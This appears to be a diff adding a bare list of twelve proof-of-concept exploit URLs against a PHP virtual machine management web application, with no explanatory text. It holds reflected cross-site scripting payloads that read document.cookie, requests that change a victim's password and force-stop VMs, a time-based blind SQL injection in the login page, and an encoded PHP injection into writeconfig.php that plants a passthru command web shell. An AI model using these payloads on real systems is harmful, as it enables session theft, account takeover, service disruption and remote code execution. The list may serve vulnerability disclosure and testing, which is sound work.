@@ -1,0 +1,12 @@
+https://www.example.com/config/edituser.php?username=1&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+https://www.example.com/config/changepw.php?username=[victim_username]&amp;newpass=[attacker&#039;s_chosen_pwd]
+https://www.example.com/hardstopvm.php?stop_vmref=[VMref]&amp;stop_vmname=[VMname]
+https://www.example.com/console.php?location=1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;&quot;&amp;vmname=myVM
+https://www.example.com/console.php?location=1&amp;sessionid=1&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;&quot;&amp;vmname=myVM
+https://www.example.com/console.php?location=1&amp;sessionid=1&amp;vmname=myVM&lt;script&gt;alert(123)&lt;/script&gt;
+https://www.example.com/forcerestart.php?vmrefid=1&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;&quot;&amp;vmname=myVM
+https://www.example.com/forcerestart.php?vmrefid=1&amp;vmname=myVM&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;&quot;
+https://www.example.com/forcesd.php?vmrefid=1&amp;vmname=myVM&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;&quot;
+https://www.example.com/forcesd.php?vmrefid=1&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;&quot;&amp;vmname=myVM
+https://www.example.com/login.php?username=user&#039; UNION SELECT if(user() LIKE &#039;root@%&#039;, benchmark(1000000,sha1(&#039;test&#039;)), &#039;false&#039;
+https://www.example.com/config/writeconfig.php?pool1=%27%3B%20%3F%3E%20%3C%3Fphp%20%24cmd%20%3D%20%24_REQUEST%5B%27cmd%27%5D%3B%20passthru%28%24cmd%29%3B%20%3F%3E%20
